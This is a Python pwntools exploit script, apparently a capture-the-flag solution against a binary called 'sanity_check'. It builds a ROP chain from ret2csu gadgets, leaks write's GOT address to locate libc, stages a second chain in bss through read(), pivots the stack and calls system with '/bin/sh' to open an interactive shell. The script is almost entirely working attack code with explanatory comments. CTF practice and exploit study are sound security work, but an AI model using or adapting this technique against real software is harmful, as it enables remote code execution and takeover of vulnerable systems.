from pwn import *

"""

0x400733: pop rdi; ret; 
0x400731: pop rsi; pop r15; ret;
0x400538: pop rbp; ret; 
0x40072e: pop r13; pop r14; pop r15; ret; 
0x4006c5: pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret;

"""

ret         = 0x4006A1
write_got   = 0x600fd0
write       = 0x4004a0
read_got    = 0x600fd8
poprdi      = 0x400733
poprsi      = 0x400731
poprbp      = 0x400538
bss         = 0x601010
popchain    = 0x4006c5
call_gadget = 0x400710

"""

  400710:	mov    rdx,r13
  400713:	mov    rsi,r14
  400716:	mov    edi,r15d
  400719:	call   QWORD PTR [r12+rbx*8] <-- call_gadget
  ...

"""

def pwn():

	r.recvline()
	r.recv(3)

	# Spam with a couple of poprdi gadgets at first because the (stack) address
	# that is used to read in our data will vary a bit in every execution. 
	chain  = p64(poprdi)*0x30
	chain += p64(0x1337)
	chain += p64(popchain)
	# rbx
	chain += p64(0)
	# r12
	chain += p64(write_got)
	# r13
	chain += p64(6)
	# rsi
	chain += p64(write_got)
	# rdi
	chain += p64(1)
	# rbp needs to be rbx + 1 in order to return smoothly from the call_gadget chain
	chain += p64(1)
	chain += p64(call_gadget)

	# Rest of the call_gadget chain. Enough to trigger our 2nd rop and final rop chain.

	"""
	0x400726:	add    rsp,0x8
	0x40072a:	pop    rbx
	0x40072b:	pop    rbp
	0x40072c:	pop    r12
	0x40072e:	pop    r13
	0x400730:	pop    r14
	0x400732:	pop    r15
	0x400734:	ret
	"""

	# Write our 2nd and final rop chain in the bss via read()
	chain += p64(0xb00bface)
	# pop rbx
	chain += p64(0)
	# rbp needs to be rbx + 1 in order to return smoothly from the call_gadget chain
	chain += p64(1)
	# r12
	chain += p64(read_got)
	# r13
	chain += p64(0x78)
	# r14
	# The reason we use an address so further away from the bss segment
	# is because during system, there are some signal setup stuff
	# which reference rbp offsets, big enough to access read-only data,
	# leading to a segfault.
	chain += p64(bss + 0x420)
	# r15
	chain += p64(0)
	chain += p64(call_gadget)

	# 3) Pivot the stack to our bss chain and call system
	chain += p64(0xb00bface)
	chain += p64(bss + 0x448) * 6
	"""
	.text:00000000004006C1                 lea     rsp, [rbp-28h]
	.text:00000000004006C5                 pop     rbx
	.text:00000000004006C6                 pop     r12
	.text:00000000004006C8                 pop     r13
	.text:00000000004006CA                 pop     r14
	.text:00000000004006CC                 pop     r15
	.text:00000000004006CE                 pop     rbp
	.text:00000000004006CF                 retn
	"""
	chain += p64(0x4006c1)
	
	r.sendline(chain)

	libc   = u64(r.recv(6).ljust(8, chr(0))) - 0xf72b0
	system = libc + 0x45390
	sh     = libc + 0x18cd57
	log.success('Libc: 0x{:x}'.format(libc))
	
	r.send(p64(0)*6 + p64(poprdi) + p64(sh) + p64(system))
	
	r.interactive()

if __name__ == "__main__":
    if sys.argv[1] == "r":
        r = remote('',)
        pwn()
    else:
        r = process('./sanity_check')
        pause()
        pwn()
